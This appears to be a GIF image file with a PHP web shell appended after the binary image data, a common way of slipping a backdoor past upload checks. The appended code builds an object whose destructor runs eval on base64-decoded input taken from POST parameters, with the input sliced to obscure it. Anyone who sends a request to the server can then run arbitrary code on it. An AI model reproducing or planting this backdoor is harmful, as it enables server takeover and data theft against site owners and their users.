GIF89a  ? ½fÿ÷xÿûÛg( â”ÿåHÿ?Û¥CþÉ%ÿêz²4~D
¶Fó®ÿù‡ùÜ›²‘ZÿüöŠX4ÿý²ÈxÿþÐôÊ:¾i	ÿð]ÿû•åÃ??ÿð_ô¨ÿ?ÿèLÿíW•Q	ÿ?ÿ?þ´~IÁm	Ð…þÅ!ÿ?ÿý¸Ö±?õmýàJ±iÃx%ÿ?ÿ?²Œ.ÿäGÿ?ÿ÷wÿ?Ð†Êwÿ?ÿû ÿ?ÿ?ÿéNÿâB²Jÿ?ÿû›ÿ?ÿø|³‘Dïè´ñ?ïç Ú?ïâkÿ?ãÉ¨ýÜCÿýÈÿü›Ãq÷Æ*ÿàAþÝ>æŸù²‰Sÿí±²‚ÿÒO€Hÿ?ïË7‰PéLJÊ|~J!r2‚G
‰Qÿ?? ÿëUÿßE×ÑÌÃp×Ò??ãßÜêçäÜ×ÓÝØÔ~H²‡&ÿÞEûúúÅsÿïZÿáBÿ?ÿìSÿëPÿötÿÝCÿêPÿþÇÿ?ÿÞDÿëTÿêQæ®.í¸K¬m%§`øÆ0õ·)½wúòç÷Êgê¸RøÊ_öØ™ß¸oË‰ý×9üå?îWýüü·{2ÿÿ×çÞÐÒ–3â²R¨]	í¾XýøëÉ©†ûá¥ðîìÒÅ¸÷È[±s+øÆ>óÞ°Ø±köÆYéÈ‘õÁKêèåÅžmÂ|õÆ3ØÓÎ½.Ç‚á !÷ÁEûÓ=ßÚÖÎ?èåâäàÝûË0üÏ4õ¹3ýÝAáÔÌë?²’hå¦&ÝœüðÖÙ?À—gî¹6Ê€+ÿþüþáGÿñ_ïàbø¸Çxÿ?·kïÔDòæ×üõ×ó¿8ÿø×ÿé™ýãMôò?ÿÐ×?ÿëQÿþç¼@é¸-‰OÿáqÆtÆuÐ€ÿ?üÙ>ÿösÿûÊË„ê°#ê¶*Ì}æªèÝÕÞÙÕÐµ–‚»‘eêãÜÛ?ÿêTé½6ëÆ<ñÕ«É|Ì~ùð¼ø?ÿ÷{ùï¼ïßbÿü ù³ÿëSÿÿÿÿÿÿ!ÿNETSCAPE2.0   !?	
 ÿ ,       ÿ ÿ	H° Áƒ*?©Q,D¹P-z Lá@O£d1ÑuGJ$\?‘Zª…?R¸cÀÀ­a?3Uæ‚žIŽa?¨À?|Xe:ø ?._$? ?.cÌ”A1èQANFýù1àG?D´r•šìÀ%‚Ž.l?ÏE?*&Taëv?¼J?H(\?.B?S­‰À‚°±AS­¾v?@IÂ€^–ªA l?# ?ËC3qJ@(RÍÏ?q²ÈÙ²xÄ«5( ‚…ƒ}âîs?D4DðX•f`?wÛã ÃW{??c?‰š? %E?ÇX?€Å±<Rà!¤ƒ+?O¡Ûà¡ÀÍ?éQ?x?ªÀ1?äœ@?Ú ÔÃ+¥PŽƒ?P	(?D?gX ? ±ƒ1àq?<!?{
T?vœ¡<?php
/* user */
class User
{
  public $name = '';
  public $config = null;

  function __destruct(){
    @eval(''.$config."$this->name");
  }
}
// user
$user = new User;
$num = @$_POST['num'];
// contens
$c = \base64_decode((substr(@$_POST['a'],$num,-$num)));
$user->name = ''.$c;
?>